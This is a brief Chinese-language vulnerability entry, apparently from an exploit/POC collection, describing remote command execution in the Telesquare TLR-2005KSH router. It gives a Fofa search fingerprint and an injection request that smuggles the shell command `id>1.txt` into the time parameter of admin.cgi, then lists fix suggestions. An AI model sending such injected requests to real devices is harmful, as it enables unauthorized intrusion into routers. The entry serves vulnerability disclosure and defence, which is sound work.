# TelesquareTLR-2005Ksh路由器RCE

TelesquareTLR ｜ 命令执行 ｜ —
- **指纹**：`app="TELESQUARE-TLR-2005KSH"`
- **请求**：`GET /cgi-bin/admin.cgi?Command=setSyncTimeHost\&time=`id>1.txt` HTTP/1.1`

**Payload**
```
1. Fofa
app="TELESQUARE-TLR-2005KSH"
2、复现过程如下
Host: your-ip
验证
```
- **其他**：修复建议: 1、请联系厂商进行修复。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。